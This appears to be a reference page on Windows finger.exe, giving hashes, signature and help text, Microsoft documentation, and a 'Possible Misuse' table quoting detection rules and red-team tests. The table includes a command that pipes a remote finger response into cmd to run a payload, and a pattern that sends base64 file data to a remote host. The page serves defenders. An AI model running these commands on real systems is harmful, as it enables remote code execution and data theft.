---
title: finger.exe | TCPIP Finger Command
excerpt: What is finger.exe?
---

# finger.exe 

* File Path: `C:\WINDOWS\system32\finger.exe`
* Description: TCPIP Finger Command

## Hashes

Type | Hash
-- | --
MD5 | `56C565BE7419852071C6DFCF36F31503`
SHA1 | `A97EB0BD11BAA5DE960BBB0839F1B5B584B52E38`
SHA256 | `DE0AADB972BC256FDBB234B8CDB5427D8318A91EDFC180D138BEB3358161B2EA`
SHA384 | `D920DA6FAD52A33DA00EAE230B5F4B464128C7F6358165D7776B8F5557B6224123D71C4CD533B5A776C363F60A8BAA7E`
SHA512 | `882C55EA96E9A54028E1065C29B2A7565CC8F9E17DAD4D413EDABABA6C047DECB3853EF6E6D91076A6241CEBC75DF47D84621C32EE81A3851D96C81A5D317CEB`
SSDEEP | `192:0T+V81sDF09kycvbhY+u6pePFzoyrAf992kATG9EUjNEwL7GaWU0W:0T+VCUF09FcDiEpedzeKTIjNbzWU0W`

## Runtime Data

### Usage (stdout):
```cmhg

[default-pc]

```

### Usage (stderr):
```cmhg

Displays information about a user on a specified system running the
Finger service. Output varies based on the remote system.

FINGER [-l] [user]@host [...]

  -l        Displays information in long list format.
  user      Specifies the user you want information about. Omit the user
            parameter to display information about all users on the
            specifed host.
  @host     Specifies the server on the remote system whose users you
            want information about.


```

### Child Processes:
conhost.exe

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: finger.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\finger.exe](finger.exe-7072125EE25D342DF114919ED68D34A1.md) | 74

## Possible Misuse

*The following table contains possible examples of `finger.exe` being misused. While `finger.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `title: Finger.exe Suspicious Invocation`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `Image\|endswith: '\finger.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `- Admin activity (unclear what they do nowadays with finger.exe)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Name: Finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Description: Displays information about a user or users on a specified remote computer that is running the Finger service or daemon`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Command: finger user@example.host.com \| more +2 \| cmd`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Description: 'Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Path: c:\windows\system32\finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Path: c:\windows\syswow64\finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- IOC: finger.exe should not be run on a normal workstation.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- IOC: finger.exe connecting to external resources.`{:.highlight .language-yaml} | 
[malware-ioc](https://github.com/eset/malware-ioc) | [nouns.txt](https://github.com/eset/malware-ioc/blob/master/kryptocibule/nouns.txt) | `finger`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #16: File download with finger.exe on Windows [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #16: File download with finger.exe on Windows [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #16 - File download with finger.exe on Windows](#atomic-test-16---file-download-with-fingerexe-on-windows) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #16 - File download with finger.exe on Windows | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | finger base64_filedata@#{remote_host} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## finger

>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Displays information about users on a specified remote computer (typically a computer running UNIX) that is running the finger service or daemon. The remote computer specifies the format and output of the user information display. Used without parameters, **finger** displays help.

> [!IMPORTANT]
> This command is available only if the Internet Protocol (TCP/IP) protocol is installed as a component in the properties of a network adapter in Network Connections.

### Syntax

```
finger [-l] [<user>] [@<host>] [...]
```

#### Parameters

| Parameter | Description |
| --------- | ----------- |
| -l | Displays user information in long list format. |
| `<user>` | Specifies the user about which you want information. If you omit the *user* parameter, this command displays information about all users on the specified computer. |
| `@<host>` | Specifies the remote computer running the finger service where you are looking for user information. You can specify a computer name or IP address. |
| /? | Displays help at the command prompt. |

##### Remarks

- You must prefix **finger** parameters with a hyphen (-) rather than a slash (/).

- Multiple `user@host` parameters can be specified.

#### Examples

To display information for *user1* on the computer *users.microsoft.com*, type:

```
finger user1@users.microsoft.com
```

To display information for *all users* on the computer *users.microsoft.com*, type:

```
finger @users.microsoft.com
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


